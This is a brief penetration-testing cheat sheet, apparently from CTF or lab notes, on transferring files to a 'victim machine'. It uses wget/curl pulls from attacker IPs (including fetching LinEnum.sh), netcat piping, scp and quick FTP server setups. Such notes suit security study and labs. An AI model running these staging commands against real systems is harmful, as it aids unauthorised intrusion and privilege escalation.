# Transfering Files on Linux

## Web Transfer

### Set Up a Simple Python Webserver on Local machine
```
python -m SimpleHTTPServer 80
python3 -m http.server 80
```
### Download files to victim machine with Wget
```
wget http://10.10.14.13/LinEnum.sh
wget http://10.10.14.13/LinEnum.sh -O /tmp
wget -r -nH  --no-parent --reject="index.html*" http://10.10.14.13/dir1
```
### Download files to victim machine with Curl
```
curl -O http://192.168.0.101/file.txt
```

## Netcat
> ##### On victim machine:
```
nc -lvp 3333 > enum.sh
```
> ##### On the attacking machine:
```
nc 10.10.10.169 3333 < enum.sh
```

## SCP
```
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination
```
## FTP
### Up FTP Server on your machine:
> ##### Daemon method
```
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
systemctl restart pure-ftpd 
```

> ##### Python method
```
python -m pyftpdlib -p 21 -w
```
